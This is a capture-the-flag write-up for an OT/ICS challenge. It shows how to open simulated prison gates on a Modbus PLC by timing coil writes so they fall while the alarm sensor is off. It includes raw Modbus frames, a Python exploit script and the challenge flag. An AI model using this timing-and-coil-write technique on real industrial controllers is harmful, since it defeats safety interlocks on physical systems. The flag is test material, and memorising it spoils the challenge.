# Save Your Friends

**Points: 700**  
**Category:** OT/ICS  
**Hint:** Your friend is in jail and you need to free him. You have gained access to a laptop (Laptop_1) inside the prison that enables serial modbus communication. Laptop_1 sends packets to Laptop_2, which converts them into valid modbus packets (with CRC) and sends those packets to the PLC. Send the right commands and free your friend. Ohh, and I almost forgot!! Don't get caught!!!!!!

**URL:** `saveyourfriendsot-csc26.cybersecuritychallenge.al:9995`

## Solution

### How I Solved It

#### 1. Initial Reconnaissance

First, I connected to the server to understand the interface:

```bash
nc saveyourfriendsot-csc26.cybersecuritychallenge.al 9995
```

The server presented a menu:
```
You are now connected to Programmable Logic Controller
1. Type 1 to read Modbus data
2. Type 2 to send Modbus data
```

**Reading the initial state (option 1):**
```json
{
  "manual_mode": 0,
  "auto_mode": 1,
  "open_gates": 0,
  "sensor_on": 1,
  "gate_1": 1,
  "gate_2": 1,
  "gate_3": 1,
  "gate_4": 1,
  "flag": ""
}
```

#### 2. Analyzing the System Architecture

From the challenge description and provided diagrams, I identified:

- **PLC:** Slave address **71** (0x47)
- **Coil 103:** `auto_mode` control
- **Coil 1337:** `open_gates` control
- **Laptop-1 → Laptop-2 → PLC:** Modbus RTU communication chain
- **Laptop-2** adds CRC automatically, so we send commands **without CRC**

#### 3. Understanding the Ladder Logic

The challenge included ladder logic diagrams showing the security system:

**Critical rungs:**
1. **Rung 1-2:** When `auto_mode` is OFF → `manual_mode` SET, `sensor_on` SET
2. **Rung 3:** In `manual_mode`, after **180s timer (TON0)** → `sensor_off` SET, `sensor_on` RESET
3. **Rung 4:** When `sensor_off` is ON → after **30s timer (TON1)** → `enable_sensor` SET
4. **Rung 5:** When `enable_sensor` is ON → `sensor_on` SET (sensor re-enabled)
5. **Rung 6:** `open_gates` AND `sensor_on` → **ALARM** (get caught!)
6. **Rung 7:** `open_gates` AND NOT `sensor_on` → Gates open (friend freed!)

**Key insight:** To open gates without triggering the alarm, we need:
- `open_gates` = ON
- `sensor_on` = OFF (temporarily disabled)

#### 4. Crafting the Attack Strategy

The winning sequence:

1. **Turn OFF `auto_mode`** → This activates `manual_mode` and starts the 180s timer
2. **Wait 180+ seconds** → Timer expires, `sensor_on` gets RESET to OFF
3. **Set `open_gates` ON within the 30s window** → Gates open while sensor is disabled!

#### 5. Modbus Protocol Analysis

**Modbus RTU Function Code 0x05: Write Single Coil**

Format (without CRC):
```
[Slave Address] [Function Code] [Coil Address Hi] [Coil Address Lo] [Value Hi] [Value Lo]
```

**Command to turn OFF auto_mode (coil 103 = 0x0067):**
```
47 05 00 67 00 00
│  │  │  │  └─┴─ Value: 0x0000 = OFF
│  │  └─┴─────── Coil: 0x0067 = 103
│  └──────────── Function: 0x05 = Write Single Coil
└─────────────── Slave: 0x47 = 71
```

As hex string: `470500670000`

**Command to turn ON open_gates (coil 1337 = 0x0539):**
```
47 05 05 39 FF 00
│  │  │  │  └─┴─ Value: 0xFF00 = ON
│  │  └─┴─────── Coil: 0x0539 = 1337
│  └──────────── Function: 0x05 = Write Single Coil
└─────────────── Slave: 0x47 = 71
```

As hex string: `47050539FF00`

#### 6. Protocol Discovery

Through testing, I discovered the server expects:
- **Text-based interface** with menu options (1 or 2)
- **Hex strings without spaces** for Modbus data
- **Persistent TCP connection** to maintain PLC state (timers, coil values)

Initial attempts with separate connections failed because:
```
[SEND] Response: Valid Modbus data received: auto_mode set to 0
[READ] Response: {"auto_mode": 1, ...}  // State reset on reconnect!
```

#### 7. Exploit Implementation

I wrote a Python script that maintains a **single persistent TCP connection** throughout the entire attack:

```python
import socket
import time

HOST = "saveyourfriendsot-csc26.cybersecuritychallenge.al"
PORT = 9995

def recv_all(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data.decode(errors='replace')

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    
    # Read banner
    recv_all(sock, timeout=3)
    
    # Step 1: Read initial state
    sock.sendall(b"1\n")
    time.sleep(2)
    recv_all(sock)
    
    # Step 2: Turn OFF auto_mode
    sock.sendall(b"2\n")
    time.sleep(1)
    recv_all(sock)
    sock.sendall(b"470500670000\n")
    time.sleep(2)
    recv_all(sock)
    
    # Step 3: Verify auto_mode is OFF
    sock.sendall(b"1\n")
    time.sleep(2)
    resp = recv_all(sock)
    # Confirms: "auto_mode": 0
    
    # Step 4: Wait 185 seconds for TON0 timer
    for i in range(185, 0, -10):
        time.sleep(10)
    
    # Step 5: Verify sensor_on is now OFF
    sock.sendall(b"1\n")
    time.sleep(2)
    resp = recv_all(sock)
    # Confirms: "sensor_on": 0
    
    # Step 6: Open gates (within 30s window!)
    sock.sendall(b"2\n")
    time.sleep(1)
    recv_all(sock)
    sock.sendall(b"47050539FF00\n")
    time.sleep(2)
    recv_all(sock)
    
    # Step 7: Read final state with flag
    sock.sendall(b"1\n")
    time.sleep(2)
    print(recv_all(sock))
    
    sock.close()
```

#### 8. Successful Execution

Running the exploit:

```bash
python3 solve.py
```

**State progression:**

```
Initial:  auto_mode=1, sensor_on=1, open_gates=0
After step 2:  auto_mode=0, sensor_on=1, open_gates=0
After 185s:    auto_mode=0, sensor_on=0, open_gates=0  ← Timer expired!
After gates:   auto_mode=0, sensor_on=0, open_gates=1  ← Gates open, no alarm!
```

**Server response:**
```
Valid Modbus data received: open_gates set to 1
 o!!  !!!   o!o  |  °o   °|° 
\o.  \o/   .o|o  |   o     |  
 o    o     o o  |  .O.   .|. 
/ \  / \   / \   O  o o    |  
YOU HAVE SAVED YOUR FRIEND! csc2026{PLC_M0DBU5_53R14L_C0MM4NDS}
```

**Final state:**
```json
{
  "manual_mode": 0,
  "auto_mode": 0,
  "open_gates": 1,
  "sensor_on": 0,
  "gate_1": 0,
  "gate_2": 0,
  "gate_3": 0,
  "gate_4": 0,
  "flag": "csc2026{PLC_M0DBU5_53R14L_C0MM4NDS}"
}
```

All four gates opened (`gate_1` through `gate_4` = 0) without triggering the alarm!

### Flag

```
csc2026{PLC_M0DBU5_53R14L_C0MM4NDS}
```

### Verification

You can verify this solution by running the provided script:

```bash
python3 solve.py
```

The script will:
1. Connect to the PLC server
2. Turn OFF `auto_mode` via Modbus command `470500670000`
3. Wait 185 seconds for the security sensor timer to expire
4. Send `open_gates` command `47050539FF00` during the 30-second window
5. Retrieve the flag from the final state

**Quick manual verification:**

```bash
# Connect and interact manually
nc saveyourfriendsot-csc26.cybersecuritychallenge.al 9995

# Type: 2
# Enter: 470500670000
# Wait 185 seconds
# Type: 2
# Enter: 47050539FF00
# Type: 1 (read flag)
```

### Tools Used

- **Python 3** - Main exploit script with socket programming
- **netcat** - Initial reconnaissance and manual testing
- **Modbus RTU protocol knowledge** - Function Code 0x05 (Write Single Coil)
- **Ladder logic analysis** - Understanding PLC timer behavior and alarm conditions

